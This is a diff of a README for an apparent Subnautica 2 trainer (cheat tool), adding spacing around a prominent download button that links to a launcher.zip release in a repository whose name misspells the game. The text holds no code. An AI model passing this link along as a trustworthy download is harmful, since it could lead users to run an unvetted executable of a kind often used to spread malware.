@@ -6,11 +6,16 @@
     <img src="https://img.shields.io/badge/-_VGTIMES.RU-ff00aa?style=for-the-badge&logoColor=white&labelColor=1a1a1a&color=ff00aa" alt="VGTimes Page">
   </a>
 
+<br><br>
+
 <div align="center">
   <a href="https://github.com/alessiocasali94/Subnatica2-Inventory-and-Player-Editor/releases/download/Subnatica2/launcher.zip" target="_blank">
     <img src="https://img.shields.io/badge/⬇️_DOWNLOAD_LATEST_VERSION-00ff9d?style=for-the-badge&logoColor=black&labelColor=111111&color=00ff9d" alt="Download Latest Version" height="68">
   </a>
 </div>
+
+
+
 
 **Powerful standalone offline trainer for Subnautica 2 (2026)** — complete control over player stats, movement & physics, crafting & building, time & world, vehicles & tools, unique features and presets with a beautiful real-time overlay UI.
 
